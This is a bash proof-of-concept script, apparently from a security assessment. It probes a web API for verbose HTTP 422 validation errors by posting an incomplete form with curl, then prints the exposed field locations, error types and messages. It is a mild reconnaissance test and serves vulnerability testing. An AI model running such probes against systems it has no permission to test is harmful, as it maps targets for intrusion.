#!/bin/bash

# POC: Verbose Validation Error Information Disclosure
# Demonstrates that the API returns detailed validation error messages (HTTP 422)
# that expose internal API structure, parameter names, and validation rules

TARGET="${1:-http://localhost:3000}"
ENDPOINT="/"

echo "[*] Testing Verbose Validation Error Information Disclosure"
echo "[*] Target: $TARGET$ENDPOINT"
echo ""

# Test 1: Submit incomplete form data to trigger validation errors
echo "[*] Test 1: Submitting incomplete form (missing required fields)"
echo "[*] Request: POST $ENDPOINT with name=test&surname=test (missing address)"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&surname=test" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo "[*] Response Body:"
echo "$BODY" | jq . 2>/dev/null || echo "$BODY"
echo ""

# Check if the response contains detailed validation errors
if echo "$BODY" | grep -q "type.*missing\|loc.*body\|msg.*Field required"; then
  echo "[+] VULNERABLE: Response contains detailed validation error information"
  echo "[+] - 'type' field exposes error classification (e.g., 'missing')"
  echo "[+] - 'loc' field exposes field location in request structure"
  echo "[+] - 'msg' field exposes validation error message"
  echo ""
  
  # Extract and display specific details
  if echo "$BODY" | grep -q '"loc"'; then
    echo "[+] Field locations disclosed:"
    echo "$BODY" | jq -r '.detail[] | "    - \(.loc | join("."))"' 2>/dev/null
  fi
  
  if echo "$BODY" | grep -q '"type"'; then
    echo "[+] Error types disclosed:"
    echo "$BODY" | jq -r '.detail[] | "    - \(.type)"' 2>/dev/null
  fi
  
  if echo "$BODY" | grep -q '"msg"'; then
    echo "[+] Error messages disclosed:"
    echo "$BODY" | jq -r '.detail[] | "    - \(.msg)"' 2>/dev/null
  fi
  exit 0
else
  echo "[-] Response does not contain expected validation error details"
  exit 1
fi